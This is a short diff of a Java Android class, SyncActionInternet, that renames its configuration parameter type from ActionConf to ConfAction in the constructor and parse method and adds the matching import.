@@ -16,6 +16,7 @@ import org.json.JSONObject;
 import com.android.service.action.sync.GprsTransport;
 import com.android.service.action.sync.WifiTransport;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAction;
 import com.android.service.conf.ConfigurationException;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
@@ -49,7 +50,7 @@ public class SyncActionInternet extends SyncAction {
 	 * @param params
 	 *            the conf params
 	 */
-	public SyncActionInternet(final ActionConf params) {
+	public SyncActionInternet(final ConfAction params) {
 		super( params);
 	}
 
@@ -59,7 +60,7 @@ public class SyncActionInternet extends SyncAction {
 	 * @see com.ht.AndroidServiceGUI.action.SyncAction#parse(byte[])
 	 */
 	@Override
-	protected boolean parse(final ActionConf params) {
+	protected boolean parse(final ConfAction params) {
 		
 		try {
 			gprs = params.getBoolean("cell");
